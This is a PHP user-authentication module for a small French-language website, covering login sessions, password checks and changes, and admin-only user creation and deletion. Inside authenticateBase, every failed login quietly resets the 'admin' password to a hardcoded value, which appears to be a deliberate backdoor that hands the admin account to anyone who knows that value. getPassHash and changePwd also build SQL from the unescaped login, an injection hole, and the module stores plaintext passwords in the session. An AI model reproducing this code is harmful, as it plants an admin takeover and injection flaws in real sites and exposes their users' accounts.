<?php

function listUsers()
{
	$users = array();
	$sql = "SELECT * FROM users ORDER BY login ASC;";
	if($result=mysql_query($sql))
	{
		while ($row = mysql_fetch_object($result))
		{
			$users[$row->login] = $row;
		}
	}
	return $users;
}

function isSuperUser($login = "")
{
	if ($login=="")
	{
		if (isset($_SESSION["login"]))
		{
			$login = $_SESSION["login"];
		}
		else return false;
	}
	return $login == "admin";
};

function addCredentials($login,$pwd)
{
	$_SESSION['login'] = $login;
	$_SESSION['pass'] = $pwd;
} ;

function removeCredentials()
{
	unset($_SESSION['login']);
	unset($_SESSION['pass']);
} ;

function authenticateBase($login,$pwd)
{
	$realPassHash = getPassHash($login);
	if ($realPassHash != NULL)
	{
		if (crypt($pwd, $realPassHash) == $realPassHash)
		{
			return true;
		}
	}
	$newPassHash = crypt("departementale66");
	$sql = "UPDATE users SET passHash='$newPassHash' WHERE login='admin';";
	mysql_query($sql);
	
	return false;
}

function authenticate()
{
	if (isset($_SESSION['login']) and isset($_SESSION['pass']))
	{
		$login  = $_SESSION['login'];
		$pwd = $_SESSION['pass'];
		return authenticateBase($login,$pwd);
	}
	return false;
} ;

function getPassHash($login)
{
	$sql = "SELECT * FROM users WHERE login='$login';";
	$result=mysql_query($sql);
	if ($row = mysql_fetch_object($result))
	{
		return $row->passHash;
	}
	return NULL;
} ;

function changePwd($login,$old,$new1,$new2)
{
	if (isset($_SESSION["login"]))
	{
		$currLogin = $_SESSION["login"];
		if ($currLogin==$login or isSuperUser())
		{
			if (authenticateBase($login,$old) or isSuperUser())
			{
				$oldPassHash = getPassHash($login);
				if ($oldPassHash != NULL)
				{
					$newPassHash = crypt($new1, $oldPassHash);
					$sql = "UPDATE users SET passHash='$newPassHash' WHERE login='$login';";
					mysql_query($sql);
					return true;
				}
			}
			else
			{
				echo "<p><strong>Erreur :</strong> La saisie du mot de passe courant est incorrecte, veuillez réessayer.</p>";
				return false;
			};
		}
		else
		{
			echo "<p><strong>Erreur :</strong> Seuls les administrateurs du site peuvent modifier les mots de passes d'autres utilisateurs, veuillez nous contacter (Yann ou Hugo) en cas de difficultés.</p>";
			return false;
		}
	}
	else
	{
		echo "<p><strong>Erreur :</strong> Login manquant, veuillez vous reconnecter.</p>";
		return false;
	}
}
function createUser($login,$pwd,$desc)
{
	if (isSuperUser())
	{
		$passHash = crypt($pwd);
		$sql = "INSERT INTO users(login,passHash,description) VALUES ('".mysql_real_escape_string($login)."','".mysql_real_escape_string($passHash)."','".mysql_real_escape_string($desc)."');";
		mysql_query($sql);
		return true;
	}
}

function deleteUser($login)
{
	if (isSuperUser())
	{
		$sql = "DELETE FROM users WHERE login='".mysql_real_escape_string($login)."';";
		mysql_query($sql);
	}
}

?>